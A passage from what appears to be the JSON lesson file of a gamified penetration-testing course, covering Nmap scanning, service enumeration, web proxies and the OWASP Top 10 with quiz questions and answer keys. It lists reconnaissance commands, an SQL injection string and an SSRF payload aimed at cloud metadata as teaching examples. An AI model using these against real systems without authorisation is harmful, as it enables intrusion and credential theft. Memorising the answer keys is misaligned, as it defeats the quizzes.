            "cmd": "nmap --version | head -n 1",
            "desc": "Verify installed Nmap version and capabilities"
          }
        ],
        "guidedExercise": "Inspect the mechanics of TCP half-open SYN scanning.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-36-1",
            "type": "exact",
            "question": "What packet does Nmap send upon receiving a SYN-ACK during a TCP SYN stealth scan (-sS) to abort the handshake?",
            "visualSlots": "_ _ _",
            "acceptedAnswers": [
              "RST",
              "Reset"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Three-letter flag for Reset.",
            "explanation": "Nmap sends an RST packet to tear down the half-open connection before an application session is established."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: UDP Scanning (-sU) & Timing Templates (-T)",
        "concept": "Scanning UDP ports (`-sU`) is fundamentally different from TCP. UDP is connectionless; open services typically send zero reply to an empty probe packet! Nmap determines UDP state as follows:\n- If an empty UDP packet receives an **ICMP Port Unreachable (Type 3, Code 3)** packet, the port is **CLOSED**\n- If no response is received, Nmap marks the port as **OPEN|FILTERED**\nBecause the operating system kernel throttles ICMP Port Unreachable packets (Linux limits ICMP responses to ~1 per second), scanning all 65,535 UDP ports can take hours! Target top ports: `nmap -sU --top-ports 20`.\n**Nmap Timing Templates (`-T0` to `-T5`):**\n- `-T0 (Paranoid)` & `-T1 (Sneaky)`: Slow, serialized packets to evade IDS/IPS threshold alerts\n- `-T3 (Normal)`: Default adaptive timing\n- `-T4 (Aggressive)`: Recommended for reliable lab networks; parallelizes probes and speeds up scans.",
        "whyItMatters": "Always scan UDP top ports (53, 67, 69, 123, 161) because vulnerable services like SNMP often hide on UDP.",
        "examples": [
          "nmap -sU -p 53,161 target: Fast UDP scan of DNS and SNMP",
          "nmap -T4 -p- target: Scan all 65,535 TCP ports aggressively"
        ],
        "commands": [
          {
            "cmd": "echo 'nmap -sS -T4 -p- target -oA scan_results'",
            "desc": "Standard thorough pentest scan command"
          }
        ],
        "guidedExercise": "Analyze how timing templates balance detection evasion against scanning speed.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-36-2",
            "type": "multiple-choice",
            "question": "Why does a full UDP port scan take significantly longer to complete than a TCP SYN scan?",
            "options": [
              "UDP packets travel slower over fiber optic cables",
              "Open UDP ports often do not reply, and operating system kernels rate-limit ICMP Port Unreachable responses to closed ports",
              "UDP ports can only be scanned with written permission from ICANN",
              "UDP does not work over IPv4 networks"
            ],
            "correctIndex": 1,
            "hint": "OS kernels throttle ICMP error responses.",
            "explanation": "Operating systems rate-limit ICMP Destination Unreachable responses, causing UDP scanners to wait for timeouts."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Nmap Output Formats & Network Mapping Review",
        "concept": "Always save scan output in all three formats simultaneously using `-oA <basename>`:\n- `.nmap`: Human-readable normal output\n- `.gnmap`: Greppable format for command-line parsing\n- `.xml`: Machine-readable XML for importing into Metasploit, Faraday, or reporting tools.",
        "whyItMatters": "Saving XML output allows instant import of discovered hosts into automated vulnerability pipelines.",
        "examples": [
          "nmap -sS -p 22,80,443 target -oA target_web: Generates target_web.nmap, target_web.gnmap, target_web.xml"
        ],
        "commands": [
          {
            "cmd": "echo 'Network Enumeration with Nmap Mastered'",
            "desc": "Complete Network Scan Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Ping sweeps (-sn), TCP SYN stealth scans (-sS) vs connect scans (-sT), UDP scanning mechanics (-sU), timing templates (-T4), and output formats (-oA).",
          "technicalTakeaways": "SYN scans send RST after SYN-ACK to avoid completing handshakes. UDP scanning is slow due to ICMP rate-limiting. Save output with -oA.",
          "commandsCovered": [
            "nmap -sn",
            "nmap -sS",
            "nmap -sU",
            "nmap -T4",
            "nmap -oA"
          ],
          "commonMistakes": "Scanning without -p- and missing backdoors listening on non-standard high ports (e.g. 8080 or 4444).",
          "learningOutcome": "You can perform host discovery, execute TCP SYN stealth scans, scan UDP ports, and save multi-format scan artifacts."
        },
        "questions": [
          {
            "id": "q-36-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Network Enumeration?",
            "options": [
              "Execute ICMP ping sweeps to discover live network hosts",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Execute ICMP ping sweeps to discover live network hosts is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-36-1",
        "type": "exact",
        "question": "What packet does Nmap send upon receiving a SYN-ACK during a TCP SYN stealth scan (-sS) to abort the handshake?",
        "visualSlots": "_ _ _",
        "acceptedAnswers": [
          "RST",
          "Reset"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Three-letter flag for Reset.",
        "explanation": "Nmap sends an RST packet to tear down the half-open connection before an application session is established."
      },
      {
        "id": "q-36-2",
        "type": "multiple-choice",
        "question": "Why does a full UDP port scan take significantly longer to complete than a TCP SYN scan?",
        "options": [
          "UDP packets travel slower over fiber optic cables",
          "Open UDP ports often do not reply, and operating system kernels rate-limit ICMP Port Unreachable responses to closed ports",
          "UDP ports can only be scanned with written permission from ICANN",
          "UDP does not work over IPv4 networks"
        ],
        "correctIndex": 1,
        "hint": "OS kernels throttle ICMP error responses.",
        "explanation": "Operating systems rate-limit ICMP Destination Unreachable responses, causing UDP scanners to wait for timeouts."
      },
      {
        "id": "q-36-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Network Enumeration?",
        "options": [
          "Execute ICMP ping sweeps to discover live network hosts",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Execute ICMP ping sweeps to discover live network hosts is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Host Discovery (Ping Sweeps) & TCP SYN Stealth Scanning",
        "instruction": "Inspect the mechanics of TCP half-open SYN scanning.",
        "hints": [
          "Three-letter flag for Reset."
        ]
      },
      {
        "title": "Task 2: UDP Scanning (-sU) & Timing Templates (-T)",
        "instruction": "Analyze how timing templates balance detection evasion against scanning speed.",
        "hints": [
          "OS kernels throttle ICMP error responses."
        ]
      },
      {
        "title": "Task 3: Nmap Output Formats & Network Mapping Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-37"
  },
  {
    "id": "room-37",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 37,
    "title": "Service Enumeration",
    "description": "Extract detailed service intelligence: banner grabbing, software version detection (-sV), Nmap Scripting Engine (NSE), and vulnerability mapping.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "40 mins",
    "xpReward": 50,
    "prerequisites": "room-36",
    "whyAreYouHere": "Extract detailed service intelligence: banner grabbing, software version detection (-sV), Nmap Scripting Engine (NSE), and vulnerability mapping.",
    "objectives": [
      "Extract application banners using netcat and curl",
      "Execute Nmap service version detection (-sV) and OS fingerprinting (-O)",
      "Deploy Nmap Scripting Engine (NSE) scripts across safe and vuln categories",
      "Correlate discovered software versions with public exploit databases (Searchsploit)"
    ],
    "skillsGained": [
      "Banner Grabbing",
      "Version Fingerprinting",
      "Nmap Scripting Engine (NSE)",
      "Exploit Correlation"
    ],
    "toolsAndCommands": [
      "nmap -sV",
      "nmap -O",
      "nmap --script",
      "nc -nv",
      "searchsploit"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Banner Grabbing & Service Version Fingerprinting (-sV)",
        "concept": "Knowing a port is open is insufficient; you must identify the exact software application and version running behind it. **Banner Grabbing** connects to a listening port and reads the welcome message returned by the daemon:\n`nc -nv 10.10.10.5 22` -> `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5`\n`nc -nv 10.10.10.5 21` -> `220 (vsFTPd 2.3.4)`\n**Nmap Version Detection (`-sV`):** Connects to the port and sends a series of probing queries from `nmap-service-probes`. Compares responses against thousands of regular expression signatures to identify the vendor, application name, and exact version number.",
        "whyItMatters": "Discovering an outdated version like vsftpd 2.3.4 immediately reveals a known backdoor vulnerability.",
        "examples": [
          "nmap -sV -p 80,443 target: Detect web server software (e.g. Apache 2.4.49)",
          "nmap -O target: TCP/IP stack fingerprinting to determine operating system"
        ],
        "commands": [
          {
            "cmd": "echo 'SSH-2.0-OpenSSH_8.9p1 Ubuntu' | grep -o 'OpenSSH_[0-9.]*'",
            "desc": "Demonstrate regex extraction of software version strings"
          }
        ],
        "guidedExercise": "Analyze how version strings pinpoint exact software builds.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-37-1",
            "type": "exact",
            "question": "Which Nmap command-line flag enables advanced Service Version Detection across open ports?",
            "visualSlots": "- _ _",
            "acceptedAnswers": [
              "-sV",
              "sV"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Lowercase s, uppercase V.",
            "explanation": "-sV instructs Nmap to probe open ports to determine service and version information."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Nmap Scripting Engine (NSE) & Vulnerability Scanning",
        "concept": "The **Nmap Scripting Engine (NSE)** provides automated script execution written in Lua (`/usr/share/nmap/scripts/`). NSE scripts are organized into categories:\n- `default`: Fast, safe reconnaissance scripts executed with `-sC`\n- `vuln`: Checks target for known CVE vulnerabilities\n- `safe`: Scripts unlikely to crash services\n- `auth`: Bypasses or checks authentication mechanisms (e.g. anonymous FTP)\n- `discovery`: Queries databases and services for user accounts and shares.\nExample commands:\n`nmap -sC target`: Run standard default scripts\n`nmap --script vuln target`: Check for critical vulnerabilities (e.g. MS17-010 EternalBlue, Heartbleed)\n`nmap --script ftp-anon target`: Check if FTP permits anonymous login.",
        "whyItMatters": "Running `-sC -sV` provides the ultimate initial reconnaissance scan on any penetration testing engagement.",
        "examples": [
          "nmap -sC -sV -p 445 target: Enumerate SMB shares, OS version, and NetBIOS name",
          "nmap --script ssl-heartbleed target: Verify OpenSSL Heartbleed vulnerability"
        ],
        "commands": [
          {
            "cmd": "ls /usr/share/nmap/scripts/ 2>/dev/null | grep -E 'smb|ftp' | head -n 5 || echo 'NSE scripts cataloged'",
            "desc": "Inspect available NSE Lua scripts"
          }
        ],
        "guidedExercise": "Explore the catalog of automated NSE reconnaissance and vulnerability scripts.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-37-2",
            "type": "exact",
            "question": "Which shorthand Nmap flag is equivalent to running default safe NSE reconnaissance scripts (--script=default)?",
            "visualSlots": "- _ _",
            "acceptedAnswers": [
              "-sC",
              "sC"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Lowercase s, uppercase C.",
            "explanation": "-sC executes default NSE scripts against all discovered open ports."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Searchsploit & Vulnerability Correlation Review",
        "concept": "Once exact versions are identified, cross-reference them against public exploit repositories using **Searchsploit** (command-line interface to Exploit-DB):\n`searchsploit vsftpd 2.3.4`\n`searchsploit apache 2.4.49`\n`searchsploit openssh 7.2`\nThis instantly identifies proof-of-concept exploit scripts for identified targets.",
        "whyItMatters": "Accurate service enumeration turns hours of guessing into targeted vulnerability verification.",
        "examples": [
          "searchsploit -m 49757: Copy exploit script directly to current directory"
        ],
        "commands": [
          {
            "cmd": "echo 'Service Enumeration & NSE Mastered'",
            "desc": "Complete Service Enum Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Banner grabbing (netcat), Nmap version detection (-sV), OS fingerprinting (-O), Nmap Scripting Engine (NSE -sC, --script vuln), and Searchsploit correlation.",
          "technicalTakeaways": "Banner grabbing identifies listening software; NSE scripts automate vulnerability checks. Version strings map directly to CVEs in Exploit-DB.",
          "commandsCovered": [
            "nmap -sV",
            "nmap -sC",
            "nmap -O",
            "searchsploit",
            "nc -nv"
          ],
          "commonMistakes": "Running aggressive exploit scripts without checking if they will crash production service daemons.",
          "learningOutcome": "You can banner grab network services, execute NSE vulnerability scripts, and cross-reference versions in exploit databases."
        },
        "questions": [
          {
            "id": "q-37-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Service Enumeration?",
            "options": [
              "Extract application banners using netcat and curl",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Extract application banners using netcat and curl is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-37-1",
        "type": "exact",
        "question": "Which Nmap command-line flag enables advanced Service Version Detection across open ports?",
        "visualSlots": "- _ _",
        "acceptedAnswers": [
          "-sV",
          "sV"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Lowercase s, uppercase V.",
        "explanation": "-sV instructs Nmap to probe open ports to determine service and version information."
      },
      {
        "id": "q-37-2",
        "type": "exact",
        "question": "Which shorthand Nmap flag is equivalent to running default safe NSE reconnaissance scripts (--script=default)?",
        "visualSlots": "- _ _",
        "acceptedAnswers": [
          "-sC",
          "sC"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Lowercase s, uppercase C.",
        "explanation": "-sC executes default NSE scripts against all discovered open ports."
      },
      {
        "id": "q-37-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Service Enumeration?",
        "options": [
          "Extract application banners using netcat and curl",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Extract application banners using netcat and curl is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Banner Grabbing & Service Version Fingerprinting (-sV)",
        "instruction": "Analyze how version strings pinpoint exact software builds.",
        "hints": [
          "Lowercase s, uppercase V."
        ]
      },
      {
        "title": "Task 2: Nmap Scripting Engine (NSE) & Vulnerability Scanning",
        "instruction": "Explore the catalog of automated NSE reconnaissance and vulnerability scripts.",
        "hints": [
          "Lowercase s, uppercase C."
        ]
      },
      {
        "title": "Task 3: Searchsploit & Vulnerability Correlation Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-38"
  },
  {
    "id": "room-38",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 38,
    "title": "Web Application Fundamentals",
    "description": "Analyze modern web applications through a security lens: client vs server architectures, DevTools DOM inspection, and Burp Suite HTTP proxying.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-37",
    "whyAreYouHere": "Analyze modern web applications through a security lens: client vs server architectures, DevTools DOM inspection, and Burp Suite HTTP proxying.",
    "objectives": [
      "Deconstruct modern web architectures (SPA, REST APIs, microservices)",
      "Inspect client-side source code, JavaScript bundles, and DOM storage in DevTools",
      "Configure an intercepting HTTP proxy (Burp Suite / OWASP ZAP)",
      "Intercept, inspect, and modify HTTP requests and responses in real-time"
    ],
    "skillsGained": [
      "Web Architecture",
      "DevTools Inspection",
      "Burp Suite Interception",
      "Proxy Configuration"
    ],
    "toolsAndCommands": [
      "curl -I",
      "curl -X POST -d",
      "which burpsuite",
      "which zaproxy"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Web Architecture: Client-Side vs Server-Side Trust",
        "concept": "Modern web applications divide into:\n- **Client-Side (Frontend):** HTML, CSS, JavaScript executing inside the user's browser (React, Vue). **Golden Rule:** The client is untrusted! Any validation performed in client-side JavaScript (e.g. checking max length or disabling a button) can be completely bypassed by an attacker using an intercepting proxy or `curl`\n- **Server-Side (Backend):** Node.js, Python, PHP, Java executing on the server, interacting with databases. All business logic, authorization, and input validation must occur on the server.\nSecurity vulnerabilities arise whenever developers assume client-side controls cannot be tampered with.",
        "whyItMatters": "Never trust client input; attackers can modify any parameter, header, or cookie before it reaches the backend.",
        "examples": [
          "Client Validation: HTML input `maxlength='10'` can be deleted in DevTools in 2 seconds",
          "Price Tampering: E-commerce app sending price in hidden input field `<input type='hidden' name='price' value='100'>`"
        ],
        "commands": [
          {
            "cmd": "curl -s https://httpbin.org/headers",
            "desc": "Inspect how client headers are received by server backends"
          }
        ],
        "guidedExercise": "Observe how client headers are transmitted and processed on the backend.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-38-1",
            "type": "multiple-choice",
            "question": "Why is client-side JavaScript input validation considered insufficient for securing web applications?",
            "options": [
              "JavaScript does not run on Linux computers",
              "Any client-side check can be completely bypassed by an attacker modifying the request in an intercepting proxy or sending direct HTTP requests",
              "JavaScript is an encrypted language that web servers cannot read",
              "HTML forms are automatically encrypted by the operating system"
            ],
            "correctIndex": 1,
            "hint": "The client environment is entirely under the user's control.",
            "explanation": "Attackers have complete control over the browser and can bypass any frontend validation using tools like Burp Suite or curl."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Intercepting HTTP Proxies: Burp Suite & OWASP ZAP",
        "concept": "An **Intercepting HTTP Proxy** (such as PortSwigger Burp Suite or OWASP ZAP) sits between the browser and web server. By configuring the browser to route traffic through `127.0.0.1:8080`, every HTTP/HTTPS request is paused in the proxy before reaching the server:\n- **Repeater:** Allows you to modify headers, parameters, and payloads and resend the request repeatedly, analyzing responses instantly\n- **Intruder:** Automates fuzzing and credential testing against target parameters\n- **Proxy History:** Full searchable archive of every request and response, including hidden API endpoints and parameters.",
        "whyItMatters": "Burp Suite Repeater is the primary workspace where penetration testers identify web vulnerabilities.",
        "examples": [
          "Intercept Request: Change `role=user` to `role=admin` in POST body before releasing to server",
          "Analyze Response: Review verbose server stack traces leaking database versions"
        ],
        "commands": [
          {
            "cmd": "echo 'Browser -> 127.0.0.1:8080 (Burp Proxy) -> Web Server'",
            "desc": "Reference HTTP proxy architecture"
          }
        ],
        "guidedExercise": "Analyze the flow of HTTP traffic through an intercepting proxy.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-38-2",
            "type": "exact",
            "question": "Which core tab/module in Burp Suite allows testers to manually modify and repeatedly resend individual HTTP requests?",
            "visualSlots": "_ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "Repeater"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Repeats requests.",
            "explanation": "Burp Suite Repeater enables rapid manual request modification and testing."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Browser DevTools Inspection & Review",
        "concept": "Browser Developer Tools (`F12`) provide immediate client-side inspection:\n- **Console:** Execute arbitrary JavaScript, read `document.cookie`\n- **Network Tab:** Inspect AJAX/XHR API requests, response headers, and payloads\n- **Application / Storage:** Inspect `localStorage`, `sessionStorage`, and stored authentication tokens (JWTs)\n- **Sources / Elements:** Review frontend JavaScript files for hardcoded API keys or developer comments.",
        "whyItMatters": "Hardcoded API secrets and internal staging endpoints are frequently found in obfuscated client-side JavaScript files.",
        "examples": [
          "Search JS bundles: `grep -r 'api_key' bundle.js`"
        ],
        "commands": [
          {
            "cmd": "echo 'Web Application Fundamentals Mastered'",
            "desc": "Complete Web Fundamentals Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Client vs server architecture (client is untrusted), intercepting proxies (Burp Suite Repeater/Proxy), and browser DevTools DOM/Storage inspection.",
          "technicalTakeaways": "All security validation must be enforced on the server. Intercepting proxies pause requests for real-time payload tampering.",
          "commandsCovered": [
            "curl",
            "Burp Suite Repeater"
          ],
          "commonMistakes": "Relying on client-side JavaScript validation or hidden form fields for security.",
          "learningOutcome": "You can configure an intercepting proxy, modify HTTP requests in Burp Suite, and audit frontend storage and APIs in DevTools."
        },
        "questions": [
          {
            "id": "q-38-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Web Application Fundamentals?",
            "options": [
              "Deconstruct modern web architectures (SPA, REST APIs, microservices)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Deconstruct modern web architectures (SPA, REST APIs, microservices) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-38-1",
        "type": "multiple-choice",
        "question": "Why is client-side JavaScript input validation considered insufficient for securing web applications?",
        "options": [
          "JavaScript does not run on Linux computers",
          "Any client-side check can be completely bypassed by an attacker modifying the request in an intercepting proxy or sending direct HTTP requests",
          "JavaScript is an encrypted language that web servers cannot read",
          "HTML forms are automatically encrypted by the operating system"
        ],
        "correctIndex": 1,
        "hint": "The client environment is entirely under the user's control.",
        "explanation": "Attackers have complete control over the browser and can bypass any frontend validation using tools like Burp Suite or curl."
      },
      {
        "id": "q-38-2",
        "type": "exact",
        "question": "Which core tab/module in Burp Suite allows testers to manually modify and repeatedly resend individual HTTP requests?",
        "visualSlots": "_ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "Repeater"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Repeats requests.",
        "explanation": "Burp Suite Repeater enables rapid manual request modification and testing."
      },
      {
        "id": "q-38-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Web Application Fundamentals?",
        "options": [
          "Deconstruct modern web architectures (SPA, REST APIs, microservices)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Deconstruct modern web architectures (SPA, REST APIs, microservices) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Web Architecture: Client-Side vs Server-Side Trust",
        "instruction": "Observe how client headers are transmitted and processed on the backend.",
        "hints": [
          "The client environment is entirely under the user's control."
        ]
      },
      {
        "title": "Task 2: Intercepting HTTP Proxies: Burp Suite & OWASP ZAP",
        "instruction": "Analyze the flow of HTTP traffic through an intercepting proxy.",
        "hints": [
          "Repeats requests."
        ]
      },
      {
        "title": "Task 3: Browser DevTools Inspection & Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-39"
  },
  {
    "id": "room-39",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 39,
    "title": "OWASP Top 10",
    "description": "Explore the canonical web vulnerability benchmark: the OWASP Top 10 web application security risks and threat mitigation.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "40 mins",
    "xpReward": 50,
    "prerequisites": "room-38",
    "whyAreYouHere": "Explore the canonical web vulnerability benchmark: the OWASP Top 10 web application security risks and threat mitigation.",
    "objectives": [
      "Analyze the OWASP Top 10 categories (Broken Access Control, Cryptographic Failures, Injection)",
      "Understand how vulnerabilities emerge in modern web applications",
      "Map real-world breach scenarios to specific OWASP classifications",
      "Apply defensive architectural principles to eradicate web vulnerability classes"
    ],
    "skillsGained": [
      "OWASP Top 10",
      "Injection Vulnerabilities",
      "Broken Access Control",
      "Security Misconfigurations"
    ],
    "toolsAndCommands": [
      "curl",
      "python3",
      "grep",
      "cat"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The OWASP Top 10 Overview & A01: Broken Access Control",
        "concept": "The **Open Web Application Security Project (OWASP)** publishes the **OWASP Top 10**, the definitive consensus standard of critical web application security risks:\n- **A01: Broken Access Control (Ranked #1):** Failures that allow users to access resources or perform actions outside their intended permissions. Examples:\n  - Insecure Direct Object References (IDOR): Accessing `/api/user/1002` simply by changing the ID number from `1001`\n  - Missing Function-Level Access Control: Accessing `/admin/delete_user` without administrator privileges\n  - Bypassing access control checks by modifying the URL, internal application state, or using an API directly\n- **A02: Cryptographic Failures:** Transmitting sensitive data (passwords, credit cards) in plaintext HTTP, using weak legacy hashing (MD5), or hardcoded keys\n- **A03: Injection (SQLi, Commandi, LDAPi):** Untrusted user data is concatenated directly into an interpreter, executing unintended commands.",
        "whyItMatters": "Broken Access Control surpassed Injection to become the #1 most common web vulnerability in the world.",
        "examples": [
          "A01: Changing URL from `account?id=45` to `account?id=46` exposes another user's private data (IDOR)",
          "A03: Concatenating input into SQL: `' OR 1=1 --`"
        ],
        "commands": [
          {
            "cmd": "echo 'OWASP A01: Broken Access Control | A02: Cryptographic Failures | A03: Injection'",
            "desc": "Reference OWASP Top 3"
          }
        ],
        "guidedExercise": "Evaluate how Broken Access Control occurs when authorization checks are missing on server endpoints.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-39-1",
            "type": "exact",
            "question": "Which category currently holds the #1 rank in the OWASP Top 10 Web Application Security Risks?",
            "visualSlots": "_ _ _ _ _ _   _ _ _ _ _ _   _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "Broken Access Control",
              "A01:2021-Broken Access Control",
              "A01"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "When access controls are broken.",
            "explanation": "Broken Access Control is the #1 web risk, affecting over 94% of tested web applications."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: A04 through A10: Modern Risk Taxonomy",
        "concept": "The remaining OWASP categories represent vital attack surfaces:\n- **A04: Insecure Design:** Flaws in architecture and threat modeling before code is written\n- **A05: Security Misconfiguration:** Default accounts enabled, verbose debug stack traces exposed, unnecessary ports open, missing security headers\n- **A06: Vulnerable and Outdated Components:** Running outdated libraries (e.g. vulnerable Log4j or Apache Struts) with known CVEs\n- **A07: Identification and Authentication Failures:** Weak password policies, missing brute-force protection, session fixation\n- **A08: Software and Data Integrity Failures:** Insecure deserialization, unverified CI/CD pipelines, untrusted auto-updates\n- **A09: Security Logging and Monitoring Failures:** Breaches go undetected because logs are not recorded or monitored\n- **A10: Server-Side Request Forgery (SSRF):** The web server fetches a remote resource without validating the user-supplied URL, allowing attackers to access internal cloud metadata (`http://169.254.169.254`).",
        "whyItMatters": "SSRF attacks against cloud instances allow attackers to steal AWS IAM role temporary credentials.",
        "examples": [
          "SSRF: Forcing a PDF generator to fetch AWS metadata: `http://169.254.169.254/latest/meta-data/`",
          "Misconfiguration: Leaving phpMyAdmin exposed on port 80 without a password"
        ],
        "commands": [
          {
            "cmd": "echo 'SSRF targets internal services: http://169.254.169.254'",
            "desc": "Reference SSRF cloud metadata endpoint"
          }
        ],
        "guidedExercise": "Trace how SSRF forces servers to act as internal proxies for the attacker.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-39-2",
            "type": "exact",
            "question": "What vulnerability occurs when a web application fetches a remote URL supplied by a user without validating the destination, exposing internal services or cloud metadata?",
            "visualSlots": "_ _ _ _",
            "acceptedAnswers": [
              "SSRF",
              "Server-Side Request Forgery"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Four-letter acronym for Server-Side Request Forgery.",
            "explanation": "SSRF (Server-Side Request Forgery) induces servers to make unauthorized requests to internal resources."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Remediation Strategies & OWASP Review",
        "concept": "Remediating OWASP vulnerabilities requires systematic engineering:\n- Injection -> Parameterized queries and prepared statements\n- Broken Access Control -> Enforce centralized server-side authorization checks on EVERY request\n- Cryptographic Failures -> TLS 1.3, AES-256-GCM, Argon2id password hashing.",
        "whyItMatters": "Parameterized queries completely eliminate SQL injection by separating code from data.",
        "examples": [
          "Defense: `db.execute('SELECT * FROM users WHERE id = ?', [userId])`"
        ],
        "commands": [
          {
            "cmd": "echo 'OWASP Top 10 Taxonomy Mastered'",
            "desc": "Complete OWASP Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "OWASP Top 10 taxonomy (Broken Access Control, Cryptographic Failures, Injection, SSRF), real-world impact, and defensive mitigations.",
          "technicalTakeaways": "Broken Access Control is #1; parameterized queries eliminate SQL injection; SSRF targets internal cloud metadata.",
          "commandsCovered": [
            "OWASP remediation patterns"
          ],
          "commonMistakes": "Thinking firewalls can fix Broken Access Control flaws (access control is application logic that firewalls cannot inspect).",
          "learningOutcome": "You can identify OWASP Top 10 vulnerability categories, explain real-world attack vectors, and recommend architectural remediations."
        },
        "questions": [
          {
            "id": "q-39-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in OWASP Top 10?",
            "options": [
              "Analyze the OWASP Top 10 categories (Broken Access Control, Cryptographic Failures, Injection)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
